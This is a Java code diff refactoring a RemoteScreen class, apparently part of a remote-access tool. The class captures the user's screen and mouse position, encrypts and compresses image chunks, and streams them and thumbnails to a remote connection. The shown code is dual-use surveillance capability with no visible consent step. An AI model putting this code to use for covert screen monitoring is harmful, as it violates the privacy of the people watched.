@@ -8,12 +8,14 @@ import java.awt.Rectangle;
 import java.awt.Robot;
 import java.awt.Toolkit;
 import java.awt.image.BufferedImage;
-import java.awt.image.DataBufferByte;
+import java.io.DataOutputStream;
 
 import com.redpois0n.common.compress.GZip;
 import com.redpois0n.common.crypto.Crypto;
-import com.redpois0n.packets.incoming.PacketBuilder;
-import com.redpois0n.packets.outgoing.Header;
+import com.redpois0n.packets.outgoing.AbstractOutgoingPacket;
+import com.redpois0n.packets.outgoing.Packet17RemoteScreen;
+import com.redpois0n.packets.outgoing.Packet18OneRemoteScreen;
+import com.redpois0n.packets.outgoing.Packet33Thumbnail;
 import com.redpois0n.utils.ImageUtils;
 
 public class RemoteScreen {
@@ -41,14 +43,13 @@ public class RemoteScreen {
 		return sum;
 	}
 	
-	public static void send(boolean once, int quality, int monitor, int ROWS, int COLS) {
+	public static void send(boolean once, int quality, int monitor, int rows, int columns, DataOutputStream dos) {
 		try {	
-			if (prevSums.length != ROWS * COLS) {
-				prevSums = new int[ROWS * COLS];
+			if (prevSums.length != rows * columns) {
+				prevSums = new int[rows * columns];
 			}	
 			float q = Float.parseFloat(quality + "") / 10F;	
 			
-			PacketBuilder packet = new PacketBuilder(once ? Header.SINGLE_IMAGE_COMING : Header.IMAGE_COMING);
 			BufferedImage image = null;
 			Rectangle screenBounds = null;
 			
@@ -64,28 +65,29 @@ public class RemoteScreen {
 				image = robotForScreen.createScreenCapture(screenBounds);
 			}
 			
-			packet.add(screenBounds.width);
-			packet.add(screenBounds.height);
 			
 			Point point = MouseInfo.getPointerInfo().getLocation();
 			
-			packet.add(point.x);
-			packet.add(point.y);
+			AbstractOutgoingPacket packet;
+			
+			if (once) {
+				packet = new Packet18OneRemoteScreen(screenBounds.width, screenBounds.height, point.x, point.y);
+			} else {
+				packet = new Packet17RemoteScreen(screenBounds.width, screenBounds.height, point.x, point.y);
+			}
 			
 			Connection.addToSendQueue(packet);
-						
-			Connection.lock();
-			
-	        int chunks = ROWS * COLS;  
-	        int chunkWidth = image.getWidth() / COLS; 
-	        int chunkHeight = image.getHeight() / ROWS;  
+									
+	        int chunks = rows * columns;  
+	        int chunkWidth = image.getWidth() / columns; 
+	        int chunkHeight = image.getHeight() / rows;  
 	        int count = 0;  
 	        int cou = 0;
-	        
+
 	        BufferedImage imgs[] = new BufferedImage[chunks];
         
-	        for (int x = 0; x < ROWS; x++) {  
-	            for (int y = 0; y < COLS; y++) {  
+	        for (int x = 0; x < rows; x++) {  
+	            for (int y = 0; y < columns; y++) {  
 	            	BufferedImage i;
 	                imgs[count] = i = new BufferedImage(chunkWidth, chunkHeight, image.getType());  
 	                Graphics2D gr = imgs[count++].createGraphics();  
@@ -108,11 +110,11 @@ public class RemoteScreen {
 	            	cou++;
 	               
 	                if (doit) {
-	                	Connection.writeBoolean(true);
-			            Connection.writeInt(buffer.length);
-			            Connection.dos.write(buffer);		    			         
+	                	dos.writeBoolean(true);
+	                	dos.writeInt(buffer.length);
+			            dos.write(buffer);		    			         
 	                } else {
-	                	Connection.writeBoolean(false);  
+	                	dos.writeBoolean(false);  
 	                }
 	            }  
 	        }  
@@ -122,7 +124,7 @@ public class RemoteScreen {
 	        }
 			
 			image.flush();
-			
+
 			prevX = point.x;
 			prevY = point.y;
 			
@@ -138,15 +140,7 @@ public class RemoteScreen {
 
 	public static void sendThumbnail() {
 		try {
-			Connection.write(Header.THUMBNAIL);
-			System.gc();
-			Rectangle screenRect = new Rectangle(Toolkit.getDefaultToolkit().getScreenSize());	
-			BufferedImage screenShot = Main.robot.createScreenCapture(screenRect);
-			screenShot = resize(screenShot, 150, 100);
-			BufferedImage bufferedImage = new BufferedImage(150, 100, BufferedImage.TYPE_3BYTE_BGR);
-			bufferedImage.getGraphics().drawImage(screenShot, 0, 0, null);
-			byte[] buffer = ((DataBufferByte) bufferedImage.getRaster().getDataBuffer()).getData();
-			Connection.dos.write(buffer);
+			Connection.addToSendQueue(new Packet33Thumbnail());
 		} catch (Exception ex) {
 			ex.printStackTrace();
 		}
